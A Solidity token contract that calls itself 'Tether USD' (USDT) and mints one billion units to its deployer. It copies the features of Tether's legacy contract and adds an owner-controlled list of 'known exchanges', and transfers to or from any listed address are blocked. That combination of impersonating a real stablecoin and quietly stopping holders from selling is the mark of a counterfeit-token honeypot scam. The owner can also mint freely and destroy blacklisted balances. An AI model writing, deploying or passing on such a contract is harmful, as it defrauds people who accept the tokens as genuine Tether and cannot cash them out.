// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract USDT {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public owner;
    address public upgradedAddress;
    bool public deprecated;
    bool public paused;

    uint256 public basisPointsRate = 0;
    uint256 public maximumFee = 0;
    uint256 public constant MAX_UINT = type(uint256).max;

    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowed;
    mapping(address => bool) public isBlackListed;
    mapping(address => bool) public knownExchanges;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Issue(uint256 amount);
    event Redeem(uint256 amount);
    event Deprecate(address newAddress);
    event Params(uint256 feeBasisPoints, uint256 maxFee);
    event Pause();
    event Unpause();
    event AddedBlackList(address user);
    event RemovedBlackList(address user);
    event DestroyedBlackFunds(address user, uint256 balance);

    constructor() {
        owner = msg.sender;
        totalSupply = 1_000_000_000 * 10 ** 6;
        balances[owner] = totalSupply;
        name = "Tether USD";
        symbol = "USDT";
        decimals = 6;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Contract paused");
        _;
    }

    modifier notBlacklisted(address addr) {
        require(!isBlackListed[addr], "Blacklisted");
        _;
    }

    modifier notExchange(address addr) {
        require(!knownExchanges[addr], "Exchange not allowed");
        _;
    }

    function transfer(address _to, uint256 _value)
        public
        whenNotPaused
        notBlacklisted(msg.sender)
        notBlacklisted(_to)
        notExchange(msg.sender)
        notExchange(_to)
        returns (bool)
    {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);
        }

        uint256 fee = (_value * basisPointsRate) / 10000;
        if (fee > maximumFee) fee = maximumFee;
        uint256 sendAmount = _value - fee;

        balances[msg.sender] -= _value;
        balances[_to] += sendAmount;

        if (fee > 0) {
            balances[owner] += fee;
            emit Transfer(msg.sender, owner, fee);
        }

        emit Transfer(msg.sender, _to, sendAmount);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value)
        public
        whenNotPaused
        notBlacklisted(_from)
        notBlacklisted(_to)
        notExchange(_from)
        notExchange(_to)
        returns (bool)
    {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);
        }

        uint256 _allowance = allowed[_from][msg.sender];
        uint256 fee = (_value * basisPointsRate) / 10000;
        if (fee > maximumFee) fee = maximumFee;
        uint256 sendAmount = _value - fee;

        if (_allowance < MAX_UINT) {
            allowed[_from][msg.sender] = _allowance - _value;
        }

        balances[_from] -= _value;
        balances[_to] += sendAmount;

        if (fee > 0) {
            balances[owner] += fee;
            emit Transfer(_from, owner, fee);
        }

        emit Transfer(_from, _to, sendAmount);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).balanceOf(_owner);
        }
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {
        require(_value == 0 || allowed[msg.sender][_spender] == 0, "Reset allowance to 0 first");
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);
        }

        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).allowance(_owner, _spender);
        }
        return allowed[_owner][_spender];
    }

    function deprecate(address _upgradedAddress) external onlyOwner {
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        emit Deprecate(_upgradedAddress);
    }

    function issue(uint256 amount) external onlyOwner {
        balances[owner] += amount;
        totalSupply += amount;
        emit Issue(amount);
    }

    function redeem(uint256 amount) external onlyOwner {
        require(balances[owner] >= amount, "Insufficient funds");
        balances[owner] -= amount;
        totalSupply -= amount;
        emit Redeem(amount);
    }

    function setParams(uint256 newBasisPoints, uint256 newMaxFee) external onlyOwner {
        require(newBasisPoints < 20, "Too high");
        require(newMaxFee < 50 * 10**decimals, "Too high");

        basisPointsRate = newBasisPoints;
        maximumFee = newMaxFee;
        emit Params(basisPointsRate, maximumFee);
    }

    function addBlackList(address _user) external onlyOwner {
        isBlackListed[_user] = true;
        emit AddedBlackList(_user);
    }

    function removeBlackList(address _user) external onlyOwner {
        isBlackListed[_user] = false;
        emit RemovedBlackList(_user);
    }

    function destroyBlackFunds(address _user) external onlyOwner {
        require(isBlackListed[_user], "Not blacklisted");
        uint256 amount = balances[_user];
        balances[_user] = 0;
        totalSupply -= amount;
        emit DestroyedBlackFunds(_user, amount);
    }

    function getBlackListStatus(address _user) external view returns (bool) {
        return isBlackListed[_user];
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function pause() external onlyOwner {
        paused = true;
        emit Pause();
    }

    function unpause() external onlyOwner {
        paused = false;
        emit Unpause();
    }

    function addExchange(address _exchange) external onlyOwner {
        knownExchanges[_exchange] = true;
    }

    function removeExchange(address _exchange) external onlyOwner {
        knownExchanges[_exchange] = false;
    }
}

abstract contract UpgradedStandardToken {
    function transferByLegacy(address from, address to, uint256 value) public virtual returns (bool);
    function transferFromByLegacy(address sender, address from, address to, uint256 value) public virtual returns (bool);
    function approveByLegacy(address from, address spender, uint256 value) public virtual returns (bool);
    function balanceOf(address who) public view virtual returns (uint256);
    function allowance(address owner, address spender) public view virtual returns (uint256);
    function totalSupply() public view virtual returns (uint256);
}